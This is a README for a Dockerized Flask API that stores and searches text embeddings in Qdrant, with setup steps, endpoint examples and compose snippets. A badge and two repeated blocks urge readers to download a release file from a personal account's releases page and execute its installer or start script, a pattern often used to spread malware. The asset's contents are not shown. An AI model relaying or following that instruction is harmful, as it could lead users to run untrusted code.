# Qdrant API Project — Dockerized Flask Embeddings & Qdrant

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Samsung2025lock/Qdrant-API-project/releases)

Releases: https://github.com/Samsung2025lock/Qdrant-API-project/releases  
Download the release file from that page and execute the packaged installer or start script.

🚀 Store and search string data using embedding vectors with Qdrant. This repo runs a Flask REST API. It uses sentence-transformers to convert text to vectors. It runs inside Docker. Use docker-compose to start the whole system.

![Architecture](https://www.vectorlogo.zone/logos/docker/docker-ar21.svg)

Table of contents
- Features
- Tech stack
- Project layout
- Quick start (Docker)
- Local development
- API: endpoints and examples
- Embedding model
- Vector schema and Qdrant tips
- Testing
- CI / CD
- Troubleshooting
- Contributing
- License

Features
- REST API for storing and searching text using vector similarity.
- Embeddings via sentence-transformers.
- Vector storage and nearest-neighbor search with Qdrant.
- Docker and docker-compose files to run the API, Qdrant, and a worker.
- Simple HTML demo page to test queries in a browser.
- Basic auth support for the API (configurable).
- Export and import of vector data.

Tech stack
- Python 3.10+
- Flask
- sentence-transformers
- Qdrant (vector database)
- Docker / docker-compose
- Requests
- Gunicorn for production WSGI

Repository topics: api, docker, docker-compose, embedding-vectors, flask, html, python, qdrant, qdrant-vector-database, rest-api, sentence-transformers

Project layout
- docker-compose.yml — orchestrates Qdrant, API, and optional services.
- api/
  - app.py — Flask app and routes.
  - models.py — DB and vector model interfaces.
  - embedder.py — wrapper around sentence-transformers.
  - requirements.txt — runtime Python deps.
  - Dockerfile — builds the API image.
- web/
  - index.html — demo UI to submit text and view results.
  - static/ — JS and CSS for the demo.
- worker/
  - ingest.py — bulk ingestion utility.
  - Dockerfile — optional worker image.
- scripts/
  - migrate.sh — DB or config migration helper.
  - run.sh — start script (packaged in releases).
- docs/
  - api.md — extra API docs and examples.
- .env.example — example environment variables.

Quick start (Docker)
1. Clone the repo.
2. Make a copy of .env.example as .env and set the values you need.
3. Start services:

```bash
docker-compose pull
docker-compose up --build -d
```

4. Check logs:

```bash
docker-compose logs -f api
```

5. Open the demo at http://localhost:8080 or call the API at http://localhost:5000.

If you prefer to use an official release, visit the releases page, download the release asset (for example qdrant-api-release.tar.gz) and run the packaged installer or start script. The release file includes a run.sh. Execute the script to build and start the service.

Releases: https://github.com/Samsung2025lock/Qdrant-API-project/releases  
Download the release file from that page and execute the packaged installer or start script.

Local development
- Create a virtual environment:

```bash
python -m venv .venv
source .venv/bin/activate
pip install -r api/requirements.txt
```

- Run Qdrant locally (if you prefer not to use Docker):

```bash
docker run -p 6333:6333 qdrant/qdrant
```

- Set environment variables:

```bash
export QDRANT_URL="http://localhost:6333"
export MODEL_NAME="sentence-transformers/all-MiniLM-L6-v2"
export FLASK_ENV=development
```

- Start the API:

```bash
cd api
flask run --host=0.0.0.0 --port=5000
```

API: endpoints and examples
All endpoints use JSON. The base URL defaults to http://localhost:5000.

1) POST /embed
- Purpose: return an embedding for a single text string.
- Request:

```json
{
  "text": "Find similar items to this sentence."
}
```

- Response:

```json
{
  "vector": [0.0123, -0.0345, ...],
  "dimension": 384
}
```

2) POST /items
- Purpose: store an item with its text and vector.
- Request:

```json
{
  "id": "item-123",
  "text": "This is sample text for storage.",
  "metadata": { "source": "upload" }
}
```

- Behavior: The server computes the embedding and upserts the vector to Qdrant.

3) GET /items/{id}
- Purpose: fetch stored item and metadata.

4) POST /search
- Purpose: nearest-neighbor search by text or vector.
- Request (by text):

```json
{
  "query": "search phrase",
  "top_k": 5
}
```

- Response:

```json
{
  "results": [
    { "id": "item-123", "score": 0.97, "metadata": { ... } },
    ...
  ]
}
```

5) POST /bulk
- Purpose: bulk ingest items from an array.
- Request:

```json
{
  "items": [
    { "id": "a", "text": "one" },
    { "id": "b", "text": "two" }
  ]
}
```

Embedder model
- Default: sentence-transformers/all-MiniLM-L6-v2
- Replace MODEL_NAME in .env to use a different model.
- The embedder outputs fixed-length float32 vectors.
- The code caches model instances. The API reuses the same model in memory.

Vector schema and Qdrant tips
- Collection name: "texts"
- Vector size: depends on the model. The API reads dimension automatically.
- Distance metric: cosine or dot product is recommended for sentence embeddings.
- Example Qdrant collection creation:

```python
client.recreate_collection(
    collection_name="texts",
    vectors_config={
        "size": 384,
        "distance": "Cosine"
    }
)
```

- Use payload filters to combine semantic search with metadata constraints.
- Use on-disk snapshots and qdrant backups for persistence in production.

Docker specifics
- api/Dockerfile uses a lightweight Python base and installs sentence-transformers.
- The docker-compose file exposes ports:
  - api: 5000
  - web: 8080
  - qdrant: 6333
- Example compose snippet:

```yaml
services:
  qdrant:
    image: qdrant/qdrant:latest
    ports:
      - "6333:6333"
  api:
    build: ./api
    ports:
      - "5000:5000"
    depends_on:
      - qdrant
  web:
    image: nginx:alpine
    ports:
      - "8080:80"
```

Scaling notes
- Run multiple API replicas behind a load balancer.
- Use shared Qdrant instance or a managed Qdrant cluster.
- Offload heavy embedder work to a dedicated worker when you scale writes.

Testing
- Unit tests live in tests/.
- Run tests:

```bash
pytest -q
```

- Use a test Qdrant instance by setting QDRANT_URL to a test server in your CI pipeline.

CI / CD
- The repo includes example GitHub Actions workflows:
  - lint.yml — runs flake8 and black checks.
  - test.yml — runs unit tests against Python 3.10 and 3.11.
  - build-and-push.yml — builds Docker images and pushes to registry.

Troubleshooting
- If the embedder fails to load, confirm MODEL_NAME and network access to download the model.
- If Qdrant returns 404 for a collection, create the collection with the correct vector size.
- If search returns low-precision results, confirm that text preprocessing matches the data used during indexing.

Contributing
- Fork the repo.
- Create a branch: feature/your-change.
- Run tests.
- Open a PR with a clear description and tests for new behavior.

Security
- Use environment variables for secrets.
- When you deploy publicly, enable authentication and TLS at the reverse proxy.

Demo UI
- The demo at / shows a simple form to insert items and query the index.
- It uses the same API endpoints described above.

Useful commands and helpers
- Recreate Qdrant collection:

```bash
python api/scripts/recreate_collection.py --collection texts --size 384 --distance Cosine
```

- Bulk ingest from CSV:

```bash
python worker/ingest.py --input data/items.csv --id-column id --text-column text
```

- Export data from Qdrant:

```bash
python api/scripts/export.py --collection texts --out exports/texts.json
```

Licensing
- MIT License. See LICENSE file.

Contact
- Open issues on GitHub for bugs or feature requests.